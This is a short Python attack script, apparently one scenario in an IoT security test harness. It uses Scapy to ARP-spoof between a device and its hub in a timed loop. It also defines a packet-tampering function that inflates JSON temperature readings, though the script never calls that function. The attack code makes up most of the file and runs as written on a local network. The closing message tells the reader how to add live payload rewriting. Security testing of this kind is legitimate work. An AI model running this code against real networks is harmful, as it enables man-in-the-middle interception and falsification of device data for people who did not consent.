"""Scenario 1: Data Tampering — ARP-spoof between device and hub, then
rewrite payload fields in flight using Scapy.
Requires: sudo, scapy, target on same LAN segment.
Usage: sudo python3 data_tampering.py <device_ip> <hub_ip> <duration_sec>
"""
import sys
import time
from scapy.all import ARP, send, sniff, IP, Raw
from logger import log_event

DEVICE_IP, HUB_IP = sys.argv[1], sys.argv[2]
DURATION = int(sys.argv[3]) if len(sys.argv) > 3 else 30


def poison():
    send(ARP(op=2, pdst=DEVICE_IP, psrc=HUB_IP), verbose=False)
    send(ARP(op=2, pdst=HUB_IP, psrc=DEVICE_IP), verbose=False)


def tamper(pkt):
    # Example: if payload looks like a JSON temp reading, bump it absurdly.
    if pkt.haslayer(Raw) and b'"temp"' in pkt[Raw].load:
        pkt[Raw].load = pkt[Raw].load.replace(b'"temp":', b'"temp": 999,')
        del pkt[IP].chksum
    return pkt


log_event("data_tampering", "attack_start", device=DEVICE_IP, hub=HUB_IP)
end_time = time.time() + DURATION
while time.time() < end_time:
    poison()
    time.sleep(1)
log_event("data_tampering", "attack_end")
print("NOTE: forwarding/rewriting packets in real time needs an active")
print("bridge (e.g. nfqueue) — this script demonstrates ARP poisoning only;")
print("wire up scapy's NetfilterQueue hook for actual payload rewriting.")
